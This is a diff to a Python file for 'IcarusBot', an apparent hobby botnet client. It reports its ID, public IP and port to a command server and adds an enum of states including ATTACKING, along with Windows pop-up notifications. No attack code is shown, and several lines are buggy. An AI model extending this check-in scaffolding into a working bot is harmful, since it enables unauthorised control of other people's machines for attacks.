@@ -4,6 +4,9 @@ import socket, signal
 import threading
 import time
 from config import API_URL
+from enum import Enum
+from win10toast import ToastNotifier
+
 
 class IcarusBot():
     """
@@ -16,9 +19,9 @@ class IcarusBot():
 
 
     def exit_gracefully(self, signum, frame):
+        """handle bot exit gracefully"""
         print("\Exiting...")
         self.update_thread.cancel()
-        sys.exit(0)
 
     def lookup(self):
         """sends request to nameserver to get command ip and port"""
@@ -33,18 +36,50 @@ class IcarusBot():
         self.update_thread = threading.Timer(3.0, self.update)
         self.update_thread.start()
         ip = requests.get('https://api.ipify.org').content.decode('utf8')
-        # setting up sockets required for port?
+        # TODO setting up sockets required for port
         payload = {'id':self.bot_id,'ip':ip,'port':25565}
-        # unsure if get or post request!
         r = requests.post(f'{API_URL}/bot/update', data=payload)
         print('updating')
+
+    def setup_socket(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def start(self):
         self.update()
 
+class BotAction(Enum):
+    """enum to track the status of our icarus bot"""
+    STARTED = 0,
+    ATTACKING = 1,
+    STOPPED = 2
+
+
 def main():
     bot = IcarusBot()
+    bot.notification(True)
     bot.start()
+
+def notification(action):
+        """opens windows notification"""
+        toast = ToastNotifier()
+        title = ""
+        body = ""
+        if (action == BotAction.STARTED):
+            title = "ICARUS BOT STARTED"
+            body = "If you didn't expect this - whoops"
+        elif (action == BotAction.ATTACKING):
+            title = "ICARUS BOT ATTACKING"
+            body = "The bot gave in to peer pressure and is attacking something"
+        else:
+            title = "ICARUS BOT CALLED OFF"
+            body = "The bot finished it's job"
+
+        toast.show_toast(
+            title,
+            body,
+            duration = 5,
+            threaded = True,
+        )
 
 if __name__ == "__main__":
     main();
